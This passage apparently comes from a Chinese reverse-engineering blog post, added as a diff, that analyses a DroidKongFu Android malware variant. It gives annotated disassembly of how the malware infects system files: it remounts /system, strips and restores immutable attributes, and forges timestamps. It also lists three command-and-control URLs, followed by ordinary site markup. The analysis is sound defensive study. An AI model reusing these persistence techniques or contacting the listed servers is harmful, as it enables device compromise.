sub_BA84         ; 设置一下时间</span><br><span class="line">.text:0000BBC0                 MOVS    R0, R4</span><br><span class="line">.text:0000BBC2                 BL      sub_B5A8          ; 去掉系统属性</span><br><span class="line">.text:0000BBC6                 MOVS    R0, R4          ; name</span><br><span class="line">.text:0000BBC8                 BLX     unlink</span><br><span class="line">.text:0000BBCC                 BLX     sync</span><br><span class="line">.text:0000BBD0                 BLX     sync</span><br><span class="line">.text:0000BBD4                 CMP     R6, #0</span><br><span class="line">.text:0000BBD6                 BNE     loc_BC00</span><br><span class="line">.text:0000BBD8                 MOVS    R0, R5</span><br><span class="line">.text:0000BBDA                 MOVS    R1, R4</span><br><span class="line">.text:0000BBDC                 BL      sub_A934        ; 将/data/.bootemp的内容写入要感染的文件</span><br><span class="line"></span><br><span class="line">.text:0000BBE0                 MOVS    R1, #0xD2</span><br><span class="line">.text:0000BBE2                 MOVS    R0, R4          ; file</span><br><span class="line">.text:0000BBE4                 LSLS    R1, R1, #1      ; mode U644</span><br><span class="line">.text:0000BBE6                 BLX     chmod           ; 设置为大家可读写</span><br><span class="line">.text:0000BBEA</span><br><span class="line">.text:0000BBEA loc_BBEA                                ; CODE XREF: sub_BB9C+6C↓j</span><br><span class="line">.text:0000BBEA                 MOVS    R0, R4</span><br><span class="line">.text:0000BBEC                 BL      sub_B5DC        ; 加上系统属性</span><br><span class="line">.text:0000BBF0                 MOV     R0, SP</span><br><span class="line">.text:0000BBF2                 BL      sub_BA84        ; 再次设置时间，为了不改变被感染文件的最后访问时间</span><br><span class="line">.text:0000BBF6                 MOVS    R0, #1</span><br><span class="line">.text:0000BBF8                 BL      sub_A820         ; 重新挂载系统分区为只读</span><br><span class="line">.text:0000BBFC                 ADD     SP, SP, #8</span><br><span class="line">.text:0000BBFE                 POP     &#123;R4-R6,PC&#125;</span><br><span class="line">.text:0000BC00 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000BC00</span><br><span class="line">.text:0000BC00 loc_BC00                                ; CODE XREF: sub_BB9C+3A↑j</span><br><span class="line">.text:0000BC00                 MOVS    R0, R5</span><br><span class="line">.text:0000BC02                 MOVS    R1, R4</span><br><span class="line">.text:0000BC04                 BL      sub_A9E4        ; 拷贝文件并更改用户组ID</span><br><span class="line">.text:0000BC08                 B       loc_BBEA</span><br></pre></td></tr></table></figure>
+
+<p>感染操作就是一个文件复制的过程，使得病毒主体文件来替换这些系统文件，感染过程大致分为4个部分：</p>
+<ul>
+<li>首先获取文件最后一次修改时间，以便后续病毒将自己最后的修改时间设置与他们相同，来达到隐藏自己不被发现的目的</li>
+<li>重新挂载&#x2F;system目录为可读可写，默认情况下&#x2F;system目录是只读挂载的，去除被感染文件不可删除的属性</li>
+<li>将&#x2F;data&#x2F;.bootemp的内容复制一份保存为要感染的文件，感染完成后调用chmod()修改其属性为644，接着调用addIattr()为文件添加不可删除属性，最后调用settime()设置文件最后修改时间、</li>
+<li>重新恢复&#x2F;system目录为只读</li>
+</ul>
+<p>在感染系统完成后，病毒开始获取系统硬件信息，然后连接远程的服务器。发现病毒共有3个服务器地址以及s1.php、s2.php与s3.php共3个请求的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ad.pandanew.com:8511/search</span><br><span class="line">http://ad.phonego8:8511/search</span><br><span class="line">http://ad.my968.com:8511/search</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%80%86%E5%90%91-android/" rel="tag">-逆向 -android</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/03/12/Flask%E6%A1%86%E6%9E%B6/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Flask框架
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Typora破解之逆向分析（上）</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2024
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://haoyun-forever.lofter.com/">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
